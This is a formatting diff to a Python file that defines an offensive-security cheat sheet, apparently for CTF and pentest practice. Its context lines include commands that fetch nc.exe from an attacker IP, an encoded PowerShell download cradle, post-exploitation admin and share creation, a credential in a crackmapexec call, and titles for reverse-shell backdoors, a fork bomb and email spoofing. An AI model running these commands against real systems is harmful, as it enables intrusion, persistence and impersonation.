@@ -1,26 +1,32 @@
 import os
+
 from .cheat import Cheat
 from .color import Color
 
 
-
 # Global functions
 def get_ip():
-	ip = os.popen("""/bin/ip add | grep "tun0" | grep "inet" | tr "/" " " | awk '{print$2}'""").read().strip()
-	if ip in "":
-		ip = "x.x.x.x"
-	return ip
+    ip = (
+        os.popen(
+            """/bin/ip add | grep "tun0" | grep "inet" | tr "/" " " | awk '{print$2}'"""
+        )
+        .read()
+        .strip()
+    )
+    if ip in "":
+        ip = "x.x.x.x"
+    return ip
+
 
 def create_new_cheat(name):
-	cheat = Cheat(name)
-	cheat_list.append(cheat)
-	return cheat
+    cheat = Cheat(name)
+    cheat_list.append(cheat)
+    return cheat
 
 
 # Global variable_name
 ip = get_ip()
 cheat_list = []
-
 
 
 ######################################
@@ -48,7 +54,7 @@ $cred.getNetworkCredential() | fl
 ######################################
 
 icmp_reverse_shell_windows = create_new_cheat(
-	"ICMP - Reverse Shell Windows / ToBase64String / FromBase64String (Nishang)"
+    "ICMP - Reverse Shell Windows / ToBase64String / FromBase64String (Nishang)"
 )
 icmp_reverse_shell_windows.category = "Windows"
 icmp_reverse_shell_windows.sub_category = "Reverse Shell"
@@ -107,7 +113,7 @@ cacls C:\PATH\File.ext
 ######################################
 
 alternative_data_streams = create_new_cheat(
-	"Alternate Data Streams (MetaData), hide file in a file"
+    "Alternate Data Streams (MetaData), hide file in a file"
 )
 alternative_data_streams.category = "Windows"
 alternative_data_streams.sub_category = "Utility"
@@ -131,7 +137,7 @@ type C:\Temp\\backup.zip:pass
 ######################################
 
 firewall_rules_change_to_accept_IP_Attacker = create_new_cheat(
-	"Create new local user with administrator privilege - Firewall Rules - PostExploit"
+    "Create new local user with administrator privilege - Firewall Rules - PostExploit"
 )
 firewall_rules_change_to_accept_IP_Attacker.category = "Windows"
 firewall_rules_change_to_accept_IP_Attacker.sub_category = "PostExploit"
@@ -161,7 +167,9 @@ net share attacker_folder=C:\Windows\Temp /GRANT:Administrators,FULL
 ######################################
 ######################################
 
-evil_winrm = create_new_cheat("Evil-winrm - (Web Service Management Protocol WS-Management) ")
+evil_winrm = create_new_cheat(
+    "Evil-winrm - (Web Service Management Protocol WS-Management) "
+)
 evil_winrm.category = "Windows"
 evil_winrm.sub_category = "WinRM"
 evil_winrm.output = """[*] Evil-winrm - Automated tool to bind stable shell when WS-Management Protocol is active an open and we have correct credentials
@@ -216,7 +224,7 @@ sudo restart ipsec
 ######################################
 
 file_transfere_windows_iwr = create_new_cheat(
-	"File Transfere Windows - IWR - Invoke-WebRequest / IEX - WebClient downloadString / certutil.exe"
+    "File Transfere Windows - IWR - Invoke-WebRequest / IEX - WebClient downloadString / certutil.exe"
 )
 file_transfere_windows_iwr.category = "Windows"
 file_transfere_windows_iwr.sub_category = "File Transfere"
@@ -240,7 +248,7 @@ certutil -urlcache -f http://10.10.14.53:80/nc.exe C:\Temp\\nc.exe
 ######################################
 
 file_transfere_windows_smbserver = create_new_cheat(
-	"File Transfere Windows - SmbServer.py (Impacket)"
+    "File Transfere Windows - SmbServer.py (Impacket)"
 )
 file_transfere_windows_smbserver.category = "Windows"
 file_transfere_windows_smbserver.sub_category = "File Transfere"
@@ -260,7 +268,9 @@ copy \\\\10.10.14.53\smbFolder\\nc64.exe C:\Windows\Temp\\nc64.exe
 ######################################
 ######################################
 
-oracle_odat = create_new_cheat("odat - Oracle DatabaseAttacking Tools - 1521 TCP oracle-tns")
+oracle_odat = create_new_cheat(
+    "odat - Oracle DatabaseAttacking Tools - 1521 TCP oracle-tns"
+)
 oracle_odat.category = "Tools"
 oracle_odat.sub_category = "Databases"
 
@@ -310,7 +320,7 @@ crackmapexec winrm 10.10.10.193 -u 'svc-print' -p '$fab@s3Rv1ce$1'
 ######################################
 
 cewl = create_new_cheat(
-	"cewl - Create a list of password (or something) from all words of a html page"
+    "cewl - Create a list of password (or something) from all words of a html page"
 )
 cewl.category = "Tools"
 cewl.sub_category = "Password"
@@ -323,7 +333,9 @@ cewl -w passwords.txt http://10.10.10.100/ --with-numbers
 ######################################
 ######################################
 
-smbpasswd = create_new_cheat("smbpasswd - SMB STATUS_PASSWORD_MUST_CHANGE - Impacket - 445 TCP")
+smbpasswd = create_new_cheat(
+    "smbpasswd - SMB STATUS_PASSWORD_MUST_CHANGE - Impacket - 445 TCP"
+)
 smbpasswd.category = "Windows"
 smbpasswd.sub_category = "Impacket"
 smbpasswd.output = """[*] smbpasswd - change a user's SMB password
@@ -622,7 +634,7 @@ done
 ######################################
 
 find_and_grep = create_new_cheat(
-	"Find - Grep for Basic enumeration Linux (Clear Usernames or passes, SUID)"
+    "Find - Grep for Basic enumeration Linux (Clear Usernames or passes, SUID)"
 )
 find_and_grep.category = "Linux"
 find_and_grep.sub_category = "Utility"
@@ -677,7 +689,7 @@ network.sub_category = "Enumeration"
 network.output = """[*] Basic Network enumeration on Linux
 
 cat /proc/net/tcp
-for b in $(cat /proc/net/tcp | grep -v "rem_add" | tr ':' ' ' | awk '{print $3}' | sort -u); do python3 -c "print("0x$b")"; done
+for b in $(cat /proc/net/tcp | grep -v "rem_add" | tr ':' ' ' | awk '{print $4}' | sort -u); do python3 -c "print("0x$b")"; done | sort -u
 cat /proc/net/fib_trie
 cat /etc/knockd.conf
 
@@ -714,7 +726,7 @@ tcpdump tcp dst 192.168.1.7 80 and tcp dst 10.5.5.252 21 # tcpdump tcp dst [ip] 
 ######################################
 
 capabilities = create_new_cheat(
-	"Capabilities - setcap / getcap / setuid - Basic enumeration Linux"
+    "Capabilities - setcap / getcap / setuid - Basic enumeration Linux"
 )
 capabilities.category = "Linux"
 capabilities.sub_category = "Enumeration"
@@ -730,7 +742,7 @@ setcap cap_setuid+ep /path/to/binary  # set uid for scale faster praticaly invis
 ######################################
 
 findSubDomain_dns = create_new_cheat(
-	"nslookup / dig / dnsenum / virtual hosts - Get SubDomain - DNS"
+    "nslookup / dig / dnsenum / virtual hosts - Get SubDomain - DNS"
 )
 findSubDomain_dns.category = "Tools"
 findSubDomain_dns.sub_category = "DNS"
@@ -919,7 +931,7 @@ webShell.output = f"""[*] Web Shell em PHP
 ######################################
 
 fakeShell = create_new_cheat(
-	"Fake Shell in bash for web shell with parameter and RCE - urlencoded"
+    "Fake Shell in bash for web shell with parameter and RCE - urlencoded"
 )
 fakeShell.category = "Web"
 fakeShell.sub_category = "RCE"
@@ -950,7 +962,7 @@ done
 ######################################
 
 treeWorpress = create_new_cheat(
-	"Wordpress - WP - Tree/structure of basic wordpress path and files"
+    "Wordpress - WP - Tree/structure of basic wordpress path and files"
 )
 treeWorpress.category = "Web"
 treeWorpress.sub_category = "CMS"
@@ -1387,7 +1399,9 @@ sudo chisel server -p 8008 --reverse   # port 8008 is the port of the chisel ser
 ######################################
 ######################################
 
-jwt_openssl = create_new_cheat("JWT - openssl | get certificate via openssl | self-signed certificate")
+jwt_openssl = create_new_cheat(
+    "JWT - openssl | get certificate via openssl | self-signed certificate"
+)
 jwt_openssl.category = "Web"
 jwt_openssl.sub_category = "Cookie"
 jwt_openssl.output = """[*] Generate privKey to manipulate JWT token
@@ -1414,7 +1428,9 @@ openssl pkcs12 -export -inkey client.key -in client.cer -out client.p12
 ######################################
 ######################################
 
-juicyPotato = create_new_cheat("JuicyPotato.exe - Windows - PrivEsc - SeImpersonatePrivilege")
+juicyPotato = create_new_cheat(
+    "JuicyPotato.exe - Windows - PrivEsc - SeImpersonatePrivilege"
+)
 juicyPotato.category = "Windows"
 juicyPotato.sub_category = "PrivEsc via group"
 juicyPotato.output = """[*] If in life you see SeImpersonatePrivilege, just use JuicyPotato!! =)
@@ -1473,7 +1489,7 @@ john --wordlist=/usr/share/wordlist/rockyou.txt hash
 ######################################
 
 sqsh = create_new_cheat(
-	"sqsh - sqsh - Interactive database shell (mysql for 1433/tcp  open  ms-sql-s) - mssqlclient.py"
+    "sqsh - sqsh - Interactive database shell (mysql for 1433/tcp  open  ms-sql-s) - mssqlclient.py"
 )
 sqsh.category = "Tools"
 sqsh.sub_category = "Databases"
@@ -1522,7 +1538,9 @@ curl -s -X GET 'http://10.10.10.167/admin.php' -H 'X-Forwarded-For: 192.168.4.28
 ######################################
 ######################################
 
-checkenv = create_new_cheat("Check Env if is 64 bits - Is64BitOperatingSystem - Is64BitProcess")
+checkenv = create_new_cheat(
+    "Check Env if is 64 bits - Is64BitOperatingSystem - Is64BitProcess"
+)
 checkenv.category = "Windows"
 checkenv.sub_category = "Powershell"
 checkenv.output = """[*] Check Env on windows to make sure the environment is equal to the system
@@ -1548,7 +1566,9 @@ cmd /c sc start seclogon
 ######################################
 ######################################
 
-bloodhound = create_new_cheat("bloodhound-python / SharpHound - AD domain | neo4j - Windows")
+bloodhound = create_new_cheat(
+    "bloodhound-python / SharpHound - AD domain | neo4j - Windows"
+)
 bloodhound.category = "Windows"
 bloodhound.sub_category = "Enumeration"
 bloodhound.output = """[*] bloodhound-python - Enumerate All AD domain for bloodhound GUI in LOCAL
@@ -1674,7 +1694,7 @@ upx executableFile
 ######################################
 
 kerbrute = create_new_cheat(
-	"kerbrute / GetNPUsers.py - Enumerate Users from DC/AD Windows through Kerberos Pre-Authentication (AS-REP Roasting)"
+    "kerbrute / GetNPUsers.py - Enumerate Users from DC/AD Windows through Kerberos Pre-Authentication (AS-REP Roasting)"
 )
 kerbrute.category = "Windows"
 kerbrute.sub_category = "Kerberos"
@@ -1805,7 +1825,9 @@ socat TCP-LISTEN:445,fork TCP:dead:beef::b885:d62a:d679:573f:445
 ######################################
 ######################################
 
-mp_cmd_exe = create_new_cheat("MpCmdRun.exe - Force Scan AntiVirus for Responder.py - AV - NTML")
+mp_cmd_exe = create_new_cheat(
+    "MpCmdRun.exe - Force Scan AntiVirus for Responder.py - AV - NTML"
+)
 mp_cmd_exe.category = "Windows"
 mp_cmd_exe.sub_category = "PrivEsc"
 mp_cmd_exe.output = """[*] MpCmdRun.exe - dedicated command-line tool of Microsoft Defender Antivirus
@@ -1843,7 +1865,9 @@ forkBomb.output = """[*] Fork Bomb - Creates processes until system "crashes"
 ######################################
 ######################################
 
-linuxPersistenceReverseShell = create_new_cheat("Reverse Shell - Persistent Reverse Collectors")
+linuxPersistenceReverseShell = create_new_cheat(
+    "Reverse Shell - Persistent Reverse Collectors"
+)
 linuxPersistenceReverseShell.category = "Linux"
 linuxPersistenceReverseShell.sub_category = "Reverse Shell"
 linuxPersistenceReverseShell.output = f"""[*] Persistent reverse shell backdoor via crontab
@@ -1854,7 +1878,9 @@ linuxPersistenceReverseShell.output = f"""[*] Persistent reverse shell backdoor 
 ######################################
 ######################################
 
-connectDatabaseViaPHP = create_new_cheat("php --interactive - connect to database via php - PDO connection")
+connectDatabaseViaPHP = create_new_cheat(
+    "php --interactive - connect to database via php - PDO connection"
+)
 connectDatabaseViaPHP.category = "Tools"
 connectDatabaseViaPHP.sub_category = "Databases"
 connectDatabaseViaPHP.output = """[*] php --interactive - connect to database via php when we have no mysql or similar in target machine
@@ -1873,7 +1899,9 @@ php > print_r($results);
 ######################################
 ######################################
 
-sshPassInCMD = create_new_cheat("sshpass - write password in command line on login with sshpass")
+sshPassInCMD = create_new_cheat(
+    "sshpass - write password in command line on login with sshpass"
+)
 sshPassInCMD.category = "Tools"
 sshPassInCMD.sub_category = "Password"
 sshPassInCMD.output = """[*] sshpass - write password in command line on login with sshpass
@@ -2083,7 +2111,9 @@ rsaDecrypt.output = """[*] Decrypt RSA keys
 ######################################
 ######################################
 
-openPortsForDontAskSudoAllTime = create_new_cheat("Unrestrict ports for use all ports under 1000 without sudo privilege")
+openPortsForDontAskSudoAllTime = create_new_cheat(
+    "Unrestrict ports for use all ports under 1000 without sudo privilege"
+)
 openPortsForDontAskSudoAllTime.category = "Kali"
 openPortsForDontAskSudoAllTime.sub_category = "Configurations"
 openPortsForDontAskSudoAllTime.output = """[*] remove all privileged ports on linux
@@ -2093,7 +2123,9 @@ echo 'net.ipv4.ip_unprivileged_port_start=0' > /etc/sysctl.d/50-unprivileged-por
 #apply conf
 sysctl --system
 """
-sendImpersonatedEmailViaCli = create_new_cheat("email - send impersonated email with swaks (CLI)")
+sendImpersonatedEmailViaCli = create_new_cheat(
+    "email - send impersonated email with swaks (CLI)"
+)
 sendImpersonatedEmailViaCli.category = "Tools"
 sendImpersonatedEmailViaCli.sub_category = "Email"
 sendImpersonatedEmailViaCli.output = """[*] Send an impersonated email via swaks (CLI)
@@ -2212,7 +2244,6 @@ youtube-dl --extract-audio --audio-format mp3 https://www.youtube.com/watch?v=IW
 """
 
 
-
 ######################################
 ######################################
 
@@ -2236,7 +2267,9 @@ powershell -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwA
 ######################################
 ######################################
 
-python_encrypt_buffer_over_flow = create_new_cheat("Print special char for buffer overflow with python3 - 0xdeadbeef")
+python_encrypt_buffer_over_flow = create_new_cheat(
+    "Print special char for buffer overflow with python3 - 0xdeadbeef"
+)
 python_encrypt_buffer_over_flow.category = "Python"
 python_encrypt_buffer_over_flow.sub_category = "Encoding"
 python_encrypt_buffer_over_flow.output = """[*] Print special char for buffer overflow with python3 - 0xdeadbeef
@@ -2321,7 +2354,9 @@ p.interactive()
 ######################################
 ######################################
 
-get_clean_memleak = create_new_cheat("Clean a memory leak information - memleak cleaner")
+get_clean_memleak = create_new_cheat(
+    "Clean a memory leak information - memleak cleaner"
+)
 get_clean_memleak.category = "Python"
 get_clean_memleak.sub_category = "pwntools"
 get_clean_memleak.output = """[*] Clean a memory leak information - memleak cleaner
@@ -2370,7 +2405,9 @@ print(get_legible_info_from_memleak(raw_leak))
 ######################################
 ######################################
 
-locate_offset_with_pwntools = create_new_cheat("Find Offset with Pwntools and coredump file")
+locate_offset_with_pwntools = create_new_cheat(
+    "Find Offset with Pwntools and coredump file"
+)
 locate_offset_with_pwntools.category = "Python"
 locate_offset_with_pwntools.sub_category = "pwntools"
 locate_offset_with_pwntools.output = """[*] Find Offset with Pwntools and coredump file in BufferOverflow
@@ -2437,7 +2474,9 @@ for i in range(10):
 ######################################
 ######################################
 
-open_port_to_the_net = create_new_cheat("Open a port to the internet - ngrok - portfowarding")
+open_port_to_the_net = create_new_cheat(
+    "Open a port to the internet - ngrok - portfowarding"
+)
 open_port_to_the_net.category = "Web"
 open_port_to_the_net.sub_category = "Proxy"
 open_port_to_the_net.output = """[*] Create a proxy with ngrok, for forwarding a port to the internet
@@ -2461,7 +2500,9 @@ ngrok tcp 22
 ######################################
 ######################################
 
-oletools = create_new_cheat("oletools - olevba - Extract VBA code from Office files - Word, Excel, PowerPoint...")
+oletools = create_new_cheat(
+    "oletools - olevba - Extract VBA code from Office files - Word, Excel, PowerPoint..."
+)
 oletools.category = "Tools"
 oletools.sub_category = "Office"
 oletools.output = """[*] oletools - olevba - Extract VBA code from Office files
@@ -2477,7 +2518,9 @@ olevba <file> | less
 ######################################
 ######################################
 
-prototipe_polution_js = create_new_cheat("Javascript - NodeJS - AST Injection, Prototype Pollution to RCE")
+prototipe_polution_js = create_new_cheat(
+    "Javascript - NodeJS - AST Injection, Prototype Pollution to RCE"
+)
 prototipe_polution_js.category = "Web"
 prototipe_polution_js.sub_category = "RCE"
 prototipe_polution_js.output = """[*] Javascript - NodeJS - AST Injection, Prototype Pollution to RCE
@@ -2564,7 +2607,9 @@ Get-NetTCPConnection -State Listen | Select-Object -Property *,@{'Name' = 'Proce
 ######################################
 ######################################
 
-check_firewall_rules_windows = create_new_cheat("Check Firewall Rule - Windows PowerShell")
+check_firewall_rules_windows = create_new_cheat(
+    "Check Firewall Rule - Windows PowerShell"
+)
 check_firewall_rules_windows.category = "Windows"
 check_firewall_rules_windows.sub_category = "Powershell"
 check_firewall_rules_windows.output = """[*] Check Firewall Rule - Windows PowerShell
